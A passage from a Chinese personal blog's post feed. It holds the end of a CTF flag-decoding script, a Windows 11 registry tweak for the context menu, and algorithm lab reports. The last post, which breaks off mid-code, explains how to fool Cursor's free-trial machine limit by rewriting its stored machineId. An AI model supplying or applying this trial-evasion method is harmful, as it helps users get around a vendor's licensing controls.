class="number">248</span>;</span><br><span class="line">v15[<span class="number">22</span>] = <span class="number">442</span>;</span><br><span class="line">v15[<span class="number">23</span>] = <span class="number">241</span>;</span><br><span class="line">v15[<span class="number">24</span>] = <span class="number">203</span>;</span><br><span class="line">v15[<span class="number">25</span>] = <span class="number">251</span>;</span><br><span class="line">v15[<span class="number">26</span>] = <span class="number">445</span>;</span><br><span class="line">v15[<span class="number">27</span>] = <span class="number">239</span>;</span><br><span class="line">v15[<span class="number">28</span>] = <span class="number">441</span>;</span><br><span class="line">v15[<span class="number">29</span>] = <span class="number">254</span>;</span><br><span class="line">v15[<span class="number">30</span>] = <span class="number">417</span>;</span><br><span class="line">v15[<span class="number">31</span>] = <span class="number">246</span>;</span><br><span class="line">v15[<span class="number">32</span>] = <span class="number">203</span>;</span><br><span class="line">v15[<span class="number">33</span>] = <span class="number">245</span>;</span><br><span class="line">v15[<span class="number">34</span>] = <span class="number">255</span>;</span><br><span class="line">v15[<span class="number">35</span>] = <span class="number">445</span>;</span><br><span class="line">v15[<span class="number">36</span>] = <span class="number">248</span>;</span><br><span class="line">v15[<span class="number">37</span>] = <span class="number">478</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v15)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((v15[i]&gt;&gt;<span class="number">2</span>)^<span class="number">0xa</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>原文始发于微信公众号（山警网络空间安全实验室）：<a class="link"   href="http://mp.weixin.qq.com/s?__biz=MjM5Njc1OTYyNA==&mid=2450786565&idx=1&sn=ecd301d5f308bc7e4f5901f6187beb8e&chksm=b104f8228673713458801f4e84e0726a382df97bb09be1ae1750073b40483d9c79812ae35a38&scene=126&sessionid=1698029627&key=47ecebb9f9a1a9ab37c23e2ab716e98f757cd43b66b9ad462906ba0d95aa0c311338df2b6a7be5217c18b6f8e0ecc3fe0b3593d1d83e569f93e61662305bc67a41fa74f80d8ba959eb1beacdb48156642618c50bfeecdf568ee4e32fd7bf89f0aeafe201cfc09580e84c5ed97ece0d93b923605a9b90ec6157a83efc7ab9b32a&ascene=15&uin=NTY2NTA4NjQ=&devicetype=Windows+10+x64&version=63060012&lang=zh_CN&session_us=gh_544c8c38eeaf&countrycode=AL&exportkey=n_ChQIAhIQTgqEnpI5i9/UgoicLHi+DBLuAQIE97dBBAEAAAAAAAn6Da/hwEkAAAAOpnltbLcz9gKNyK89dVj0n9PVNOKQBdN8rFDq8A9WHKDE7wDDJw1sWdUYSzYiQ48kYwjfuTQa3OR8YYoUe0NrX35xA+mChNNxZFcZC51KYRhk/SiovCpzuXNc0DbIZCC3PaiSPNEY1FpsLPksd9Q/AAPZATi0k7TjwBb5HTVpyn4qJxyoNe2ehnJ+U/n/kLQVFEklAE8UOxh1EVUNMUECRQItPitOSLpXdVq6fq+l5ucDwa0M9Sfvx2MDNscY6GTwoY+0HK6Lbc5UobrfYhWM0HjKfGP9Eec=&acctmode=0&pass_ticket=tg1T215QyFg8xQQl+CQeEL+QWFNoq2hjb6qpAGBy38ocTI5ZUM9OXfIibItwtoRN&wx_header=0&fontgear=2" >科来杯第十届山东省大学生网络安全技能大赛wp<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
        <category>第十届科来杯</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>科来杯</tag>
      </tags>
  </entry>
  <entry>
    <title>简单两步，将Windows11右键菜单修改为Windows10风格</title>
    <url>/posts/831f896e.html</url>
    <content><![CDATA[<p>原文链接<a class="link"   href="http://t.csdn.cn/dhe9N" >http://t.csdn.cn/dhe9N<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Windows11更新后，右键菜单很多功能隐藏起来了，使用时需要点击“显示更多选型”才能获取完整功能。为了能获得Windows10右键菜单丝滑的体验，我总结了以下方法。</p>
<p>修改前：</p>
<p><a class="link"   href="https://img-blog.csdnimg.cn/img_convert/59704c4ffbd6af9764dd5ab84c0fc7bf.gif" >https://img-blog.csdnimg.cn/img_convert/59704c4ffbd6af9764dd5ab84c0fc7bf.gif<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>修改后：</p>
<p><a class="link"   href="https://img-blog.csdnimg.cn/img_convert/1e8911f87d020b6034f90d8b5b1a9255.gif" >https://img-blog.csdnimg.cn/img_convert/1e8911f87d020b6034f90d8b5b1a9255.gif<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="方法一：控制台操作法"><a href="#方法一：控制台操作法" class="headerlink" title="方法一：控制台操作法"></a>方法一：控制台操作法</h1><p>按住win+R打开运行窗口</p>
<p>输入cmd，打开控制台<br>在控制泰中输入下方代码，回车，显示操作成功<br>开启旧版右键菜单：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\CLSID\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;\InprocServer32&quot; /f /ve</span><br></pre></td></tr></table></figure></div>

<p>恢复windows11新版右键菜单：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg delete &quot;HKCU\Software\Classes\CLSID\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;&quot; /f</span><br></pre></td></tr></table></figure></div>


]]></content>
      <categories>
        <category>技术教程</category>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>算法设计与分析实验</title>
    <url>/posts/14455728.html</url>
    <content><![CDATA[<h3 id="实验一-阶乘"><a href="#实验一-阶乘" class="headerlink" title="实验一 阶乘"></a>实验一 阶乘</h3><p>一、实验目的和要求</p>
<p>熟悉一种编程环境及基础编程练习</p>
<p>二、实验内容</p>
<p>准备并熟悉后续实验项目所用的环境，熟悉一种编程语言的使用方式，并编写简单的求数的阶乘的程序，并通过输入 3、5、7、 10 等数值验证程序的正确性</p>
<p>三、主要仪器设备</p>
<ul>
<li>计算机</li>
<li>编程语言：Python</li>
</ul>
<p>四、实验方法与步骤</p>
<ol>
<li>打开编程环境，编写程序</li>
<li>通过输入 3、5、7、 10 等数值验证程序的正确性</li>
</ol>
<p>五、主要代码</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="built_in">input</span>(<span class="string">&quot;请输入一个整数：&quot;</span>)</span><br><span class="line">i = <span class="built_in">int</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jiecheng</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> n * jiecheng(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Powered by W1ndys&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;https://blog.w1ndys.top/&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;结果是：<span class="subst">&#123;jiecheng(i)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;—————————以下是验证值—————————&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;3的阶乘是：&quot;</span>, jiecheng(<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;5的阶乘是：&quot;</span>, jiecheng(<span class="number">5</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;7的阶乘是：&quot;</span>, jiecheng(<span class="number">7</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;10的阶乘是：&quot;</span>, jiecheng(<span class="number">10</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>六、实验数据处理及结果分析</p>
<ul>
<li>分析内容中可以使用文字和图片，可以贴实验过程和实验运行结果的截图或照片作为补充</li>
</ul>
<p>输出结果</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">请输入一个整数：5</span><br><span class="line">Powered by W1ndys</span><br><span class="line">https://blog.w1ndys.top/</span><br><span class="line">结果是：120</span><br><span class="line">—————————以下是验证值—————————</span><br><span class="line">3的阶乘是： 6</span><br><span class="line">5的阶乘是： 120</span><br><span class="line">7的阶乘是： 5040</span><br><span class="line">10的阶乘是： 3628800</span><br></pre></td></tr></table></figure></div>

<p>七、出现的问题及解决方法</p>
<ul>
<li>无</li>
</ul>
<p>八、讨论、心得体会</p>
<ul>
<li>Python 递归算法，简单易懂，但在 Python 的 math 库中，已经内置了阶乘函数，可以直接使用 math.factorial(n) 来计算 n 的阶乘。</li>
</ul>
<h3 id="实验二-斐波那契数列"><a href="#实验二-斐波那契数列" class="headerlink" title="实验二 斐波那契数列"></a>实验二 斐波那契数列</h3><p>一、实验目的和要求</p>
<p>理解递归概念及递归算法设计方法。对 Fibonacci 数列的求解问题分别设计递归的程序和非递归程序，并通过输入参数分别运行求解 Fibonacci10、20、30、40、 50 的程序比较两种策略编写的程序的运行速度。</p>
<p>二、实验内容</p>
<ul>
<li>对 Fibonacci 数列的求解问题分别设计递归的程序和非递归程序，并通过输入参数分别运行求解 Fibonacci10、20、30、40、 50 的程序比较两种策略编写的程序的运行速度。</li>
</ul>
<p>三、主要仪器设备</p>
<ul>
<li>计算机</li>
<li>编程语言：Python</li>
</ul>
<p>四、实验方法与步骤</p>
<ol>
<li>打开编程环境，编写程序</li>
<li>通过输入参数分别运行求解 Fibonacci10、20、30、40、 50 的程序比较两种策略编写的程序的运行速度</li>
</ol>
<p>五、主要代码</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归求斐波那契数列（带记忆化）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci</span>(<span class="params">n, memo=&#123;&#125;</span>):</span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> memo:</span><br><span class="line">        <span class="keyword">return</span> memo[n]</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        memo[n] = fibonacci(n - <span class="number">1</span>, memo) + fibonacci(n - <span class="number">2</span>, memo)</span><br><span class="line">        <span class="keyword">return</span> memo[n]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 非递归求斐波那契数列</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci_non_recursive</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n + <span class="number">1</span>):</span><br><span class="line">            a, b = b, a + b</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试递归求斐波那契数列的速度</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>]:</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;斐波那契数列的第 <span class="subst">&#123;n&#125;</span> 项的计算结果如下：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;递归求解结果：<span class="subst">&#123;fibonacci(n)&#125;</span>&quot;</span>)</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;递归求解耗时: <span class="subst">&#123;end_time - start_time&#125;</span> 秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 测试非递归求斐波那契数列的速度</span></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;非递归求解结果：<span class="subst">&#123;fibonacci_non_recursive(n)&#125;</span>&quot;</span>)</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;非递归求解耗时: <span class="subst">&#123;end_time - start_time&#125;</span> 秒&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>六、实验数据处理及结果分析</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">斐波那契数列的第 10 项的计算结果如下：</span><br><span class="line">递归求解结果：55</span><br><span class="line">递归求解耗时: 0.002044677734375 秒</span><br><span class="line">非递归求解结果：55</span><br><span class="line">非递归求解耗时: 0.0 秒</span><br><span class="line"></span><br><span class="line">斐波那契数列的第 20 项的计算结果如下：</span><br><span class="line">递归求解结果：6765</span><br><span class="line">递归求解耗时: 0.0 秒</span><br><span class="line">非递归求解结果：6765</span><br><span class="line">非递归求解耗时: 0.0 秒</span><br><span class="line"></span><br><span class="line">斐波那契数列的第 30 项的计算结果如下：</span><br><span class="line">递归求解结果：832040</span><br><span class="line">递归求解耗时: 0.0 秒</span><br><span class="line">非递归求解结果：832040</span><br><span class="line">非递归求解耗时: 0.0 秒</span><br><span class="line"></span><br><span class="line">斐波那契数列的第 40 项的计算结果如下：</span><br><span class="line">递归求解结果：102334155</span><br><span class="line">递归求解耗时: 0.0004742145538330078 秒</span><br><span class="line">非递归求解结果：102334155</span><br><span class="line">非递归求解耗时: 0.0 秒</span><br><span class="line"></span><br><span class="line">斐波那契数列的第 50 项的计算结果如下：</span><br><span class="line">递归求解结果：12586269025</span><br><span class="line">递归求解耗时: 0.0 秒</span><br><span class="line">非递归求解结果：12586269025</span><br><span class="line">非递归求解耗时: 0.0 秒</span><br></pre></td></tr></table></figure></div>

<p>七、出现的问题及解决方法</p>
<ul>
<li>原版斐波那契数列太慢，优化算法</li>
</ul>
<p>八、讨论、心得体会</p>
<ul>
<li>斐波那契数列的递归算法虽然简单易懂，但效率低下，时间复杂度为 O(2^n)，空间复杂度为 O(n)。非递归算法效率更高，时间复杂度为 O(n)，空间复杂度为 O(1)。</li>
</ul>
<h3 id="实验三-贪心算法"><a href="#实验三-贪心算法" class="headerlink" title="实验三 贪心算法"></a>实验三 贪心算法</h3><h4 id="一、实验目的和要求"><a href="#一、实验目的和要求" class="headerlink" title="一、实验目的和要求"></a>一、实验目的和要求</h4><p>本实验的目的是通过实现一个贪心算法来解决会议安排问题。要求是编写一个函数，能够在给定的会议开始和结束时间中，选择最多数量的会议，使得它们之间没有时间冲突。</p>
<h4 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h4><ol>
<li>理解贪心算法的基本原理。</li>
<li>实现一个函数来选择最多数量的会议。</li>
<li>测试该函数以验证其正确性。</li>
</ol>
<h4 id="三、主要仪器设备"><a href="#三、主要仪器设备" class="headerlink" title="三、主要仪器设备"></a>三、主要仪器设备</h4><ul>
<li>计算机</li>
</ul>
<h4 id="四、实验方法与步骤"><a href="#四、实验方法与步骤" class="headerlink" title="四、实验方法与步骤"></a>四、实验方法与步骤</h4><ol>
<li><strong>分析问题</strong>：确定如何使用贪心算法来解决会议安排问题。</li>
<li><strong>设计算法</strong>：根据会议的结束时间对会议进行排序。</li>
<li><strong>实现代码</strong>：编写 Python 代码来实现该算法。</li>
<li><strong>测试代码</strong>：使用示例数据测试代码的正确性。</li>
</ol>
<h4 id="五、主要代码"><a href="#五、主要代码" class="headerlink" title="五、主要代码"></a>五、主要代码</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def max_meetings(start_times, end_times):</span><br><span class="line">    # 将会议按结束时间排序</span><br><span class="line">    meetings = sorted(zip(start_times, end_times), key=lambda x: x[1])</span><br><span class="line"></span><br><span class="line">    # 初始化</span><br><span class="line">    last_end_time = 0</span><br><span class="line">    selected_meetings = []</span><br><span class="line"></span><br><span class="line">    # 选择会议</span><br><span class="line">    for start, end in meetings:</span><br><span class="line">        if start &gt;= last_end_time:</span><br><span class="line">            selected_meetings.append((start, end))</span><br><span class="line">            last_end_time = end</span><br><span class="line"></span><br><span class="line">    return selected_meetings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 示例输入</span><br><span class="line">start_times = [1, 3, 0, 5, 3, 5, 6, 8, 8, 2, 12]</span><br><span class="line">end_times = [4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]</span><br><span class="line"></span><br><span class="line"># 获取最大可安排会议</span><br><span class="line">result = max_meetings(start_times, end_times)</span><br><span class="line">print(&quot;可安排的会议:&quot;, result)</span><br></pre></td></tr></table></figure></div>

<h4 id="六、实验数据处理及结果分析"><a href="#六、实验数据处理及结果分析" class="headerlink" title="六、实验数据处理及结果分析"></a>六、实验数据处理及结果分析</h4><p>在实验中，我们使用了一组示例数据来测试代码。结果显示，算法能够正确选择最多数量的会议，并且这些会议之间没有时间冲突。通过对比手动计算的结果，验证了代码的正确性。</p>
<h4 id="七、出现的问题及解决方法"><a href="#七、出现的问题及解决方法" class="headerlink" title="七、出现的问题及解决方法"></a>七、出现的问题及解决方法</h4><p>在实现过程中，可能会遇到以下问题：</p>
<ul>
<li><p><strong>问题</strong>：排序时未考虑会议的结束时间。</p>
<ul>
<li><strong>解决方法</strong>：确保在排序时使用会议的结束时间作为关键字。</li>
</ul>
</li>
<li><p><strong>问题</strong>：未正确更新最后一个会议的结束时间。</p>
<ul>
<li><strong>解决方法</strong>：在每次选择会议后，更新 <code>last_end_time</code> 变量。</li>
</ul>
</li>
</ul>
<h4 id="八、讨论、心得体会"><a href="#八、讨论、心得体会" class="headerlink" title="八、讨论、心得体会"></a>八、讨论、心得体会</h4><p>通过本次实验，我加深了对贪心算法的理解。贪心算法在解决某些优化问题时非常有效，尤其是当问题可以分解为一系列局部最优解时。通过实践，我也体会到算法设计中细节的重要性，尤其是在处理边界条件时。</p>
<h3 id="实验四合并排序"><a href="#实验四合并排序" class="headerlink" title="实验四合并排序"></a>实验四合并排序</h3><h4 id="一、-实验目的和要求"><a href="#一、-实验目的和要求" class="headerlink" title="一、 实验目的和要求"></a>一、 实验目的和要求</h4><p>本实验的目的是通过实现合并排序算法，掌握分治法的基本思想和递归编程技巧。要求学生能够理解并实现合并排序算法，并对其时间复杂度和空间复杂度进行分析。</p>
<h4 id="二、-实验内容"><a href="#二、-实验内容" class="headerlink" title="二、 实验内容"></a>二、 实验内容</h4><ol>
<li>理论学习：学习合并排序算法的基本原理和实现方法。</li>
<li>代码实现：编写合并排序算法的 Python 代码。</li>
<li>测试与验证：对编写的代码进行测试，验证其正确性和效率。</li>
<li>结果分析：分析排序结果，讨论算法的优缺点。</li>
</ol>
<h4 id="三、-主要仪器设备"><a href="#三、-主要仪器设备" class="headerlink" title="三、 主要仪器设备"></a>三、 主要仪器设备</h4><ul>
<li>计算机</li>
<li>Python 编程环境</li>
</ul>
<h4 id="四、-实验方法与步骤"><a href="#四、-实验方法与步骤" class="headerlink" title="四、 实验方法与步骤"></a>四、 实验方法与步骤</h4><ol>
<li><p>理论学习</p>
<ul>
<li>阅读教材或参考资料，了解合并排序算法的基本原理。</li>
<li>理解分治法的思想和递归的实现方法。</li>
</ul>
</li>
<li><p>代码实现</p>
<ul>
<li>打开 Python 编程环境，创建一个新的 Python 文件。</li>
<li>编写合并排序算法的代码，确保代码结构清晰，注释详细。</li>
</ul>
</li>
<li><p>测试与验证</p>
<ul>
<li>准备一组无序数组作为测试数据。</li>
<li>运行编写的合并排序代码，对测试数据进行排序。</li>
<li>验证排序结果是否正确，记录测试数据和排序结果。</li>
</ul>
</li>
<li><p>结果分析</p>
<ul>
<li>分析排序结果，讨论合并排序算法的时间复杂度和空间复杂度。</li>
<li>比较合并排序与其他排序算法的优缺点，总结实验心得。</li>
</ul>
</li>
</ol>
<h4 id="五、-主要代码"><a href="#五、-主要代码" class="headerlink" title="五、 主要代码"></a>五、 主要代码</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge_sort</span>(<span class="params">arr</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(arr) &gt; <span class="number">1</span>:</span><br><span class="line">        mid = <span class="built_in">len</span>(arr) // <span class="number">2</span></span><br><span class="line">        left_half = arr[:mid]</span><br><span class="line">        right_half = arr[mid:]</span><br><span class="line"></span><br><span class="line">        merge_sort(left_half)</span><br><span class="line">        merge_sort(right_half)</span><br><span class="line"></span><br><span class="line">        i = j = k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(left_half) <span class="keyword">and</span> j &lt; <span class="built_in">len</span>(right_half):</span><br><span class="line">            <span class="keyword">if</span> left_half[i] &lt; right_half[j]:</span><br><span class="line">                arr[k] = left_half[i]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                arr[k] = right_half[j]</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(left_half):</span><br><span class="line">            arr[k] = left_half[i]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> j &lt; <span class="built_in">len</span>(right_half):</span><br><span class="line">            arr[k] = right_half[j]</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试合并排序</span></span><br><span class="line">arr = [<span class="number">8</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>]</span><br><span class="line">merge_sort(arr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;排序后的数组:&quot;</span>, arr)</span><br></pre></td></tr></table></figure></div>

<h4 id="六、-实验数据处理及结果分析"><a href="#六、-实验数据处理及结果分析" class="headerlink" title="六、 实验数据处理及结果分析"></a>六、 实验数据处理及结果分析</h4><p>在实验过程中，我们对一组无序数组进行了合并排序。以下是实验数据和结果分析：</p>
<ul>
<li>测试数据： [8, 3, 2, 9, 7, 1, 5, 4]</li>
<li>排序结果： [1, 2, 3, 4, 5, 7, 8, 9]</li>
</ul>
<p>通过对比排序前后的数组，可以看出合并排序算法成功地将无序数组排序为有序数组。合并排序的时间复杂度为 O(n log n)，空间复杂度为 O(n)。</p>
<h4 id="七、-出现的问题及解决方法"><a href="#七、-出现的问题及解决方法" class="headerlink" title="七、 出现的问题及解决方法"></a>七、 出现的问题及解决方法</h4><p>在实验过程中，我们遇到了一些问题：</p>
<ol>
<li><p>问题：代码中存在数组索引越界的错误。<br>解决方法：通过检查数组索引的边界条件，确保在访问数组元素时不会越界。</p>
</li>
<li><p>问题：排序结果不正确。<br>解决方法：仔细检查合并排序算法的实现，发现是由于合并过程中索引变量更新不正确导致的，修正后问题解决。</p>
</li>
</ol>
<h4 id="八、-讨论、心得体会"><a href="#八、-讨论、心得体会" class="headerlink" title="八、 讨论、心得体会"></a>八、 讨论、心得体会</h4><p>通过本次实验，我们深入理解了合并排序算法的原理和实现过程。合并排序是一种稳定的排序算法，适用于大规模数据的排序。与其他排序算法相比，合并排序的时间复杂度较低，但空间复杂度较高。在实际应用中，可以根据具体需求选择合适的排序算法。</p>
<p>本次实验还让我们意识到，编写代码时需要特别注意边界条件和索引的正确性，避免出现数组越界等问题。同时，通过不断调试和修正代码，我们提高了编程能力和解决问题的能力。</p>
]]></content>
      <categories>
        <category>算法设计与分析</category>
      </categories>
      <tags>
        <tag>算法设计与分析</tag>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过Cursor的机器绑定限制</title>
    <url>/posts/2b8fba96.html</url>
    <content><![CDATA[<h1 id="如何绕过-Cursor-免费版的机器绑定限制"><a href="#如何绕过-Cursor-免费版的机器绑定限制" class="headerlink" title="如何绕过 Cursor 免费版的机器绑定限制"></a>如何绕过 Cursor 免费版的机器绑定限制</h1><p>在使用 Cursor 免费版时，很多用户会发现，在尝试删除账号并重新注册时，仍然会受到“Too many free trial accounts used on this machine”的提示。这是因为 Cursor 会通过机器码（machineId）来限制每台机器只能绑定 3 次账号，超出次数后，删除账号、重装软件等方法都无法恢复免费试用期。</p>
<h2 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h2><p>Cursor 使用机器的唯一标识符（即 machineId）来绑定账号，每台机器在使用免费试用时，只能与三个不同的账号绑定。超过 3 次后，系统会检测到你的机器已经超过了免费试用的限制，即使你删除了账号并重新注册，机器 ID 依然存在，导致无法继续使用免费试用期。</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>为了绕过这个限制，我们需要通过修改 Cursor 存储的机器 ID 来重新生成一个新的机器标识符，从而“欺骗” Cursor，让它认为这是一个全新的设备。下面是实现这一方法的详细步骤。</p>
<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><ol>
<li>生成一个新的机器 ID<br>我们需要编写一个 Python 脚本来生成新的 machineId，并更新到 storage.json 文件中。</li>
</ol>
<h2 id="Python-代码"><a href="#Python-代码" class="headerlink" title="Python 代码"></a>Python 代码</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    请以管理员身份运行 PowerShell，并执行以下命令：</span></span><br><span class="line"><span class="string">    python change_machine_id.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前 Windows 用户的主目录</span></span><br><span class="line">user_home_dir = os.path.expanduser(<span class="string">&quot;~&quot;</span>)</span><br><span class="line">storage_file = os.path.join(</span><br><span class="line">    user_home_dir, <span class="string">r&quot;AppData\Roaming\Cursor\User\globalStorage\storage.json&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;当前用户主目录: <span class="subst">&#123;user_home_dir&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;storage_file: <span class="subst">&#123;storage_file&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机 ID</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_id</span>():</span><br><span class="line">    <span class="keyword">return</span> uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取新的 ID（从命令行参数或自动生成）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_new_id</span>():</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> generate_random_id()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建备份</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backup_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(file_path):</span><br><span class="line">        backup_path = <span class="string">f&quot;<span class="subst">&#123;file_path&#125;</span>.backup_<span class="subst">&#123;datetime.now().strftime(<span class="string">&#x27;%Y%m%d_%H%M%S&#x27;</span>)&#125;</span>&quot;</span></span><br><span class="line">        shutil.copy(file_path, backup_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;已创建备份文件: <span class="subst">&#123;backup_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span 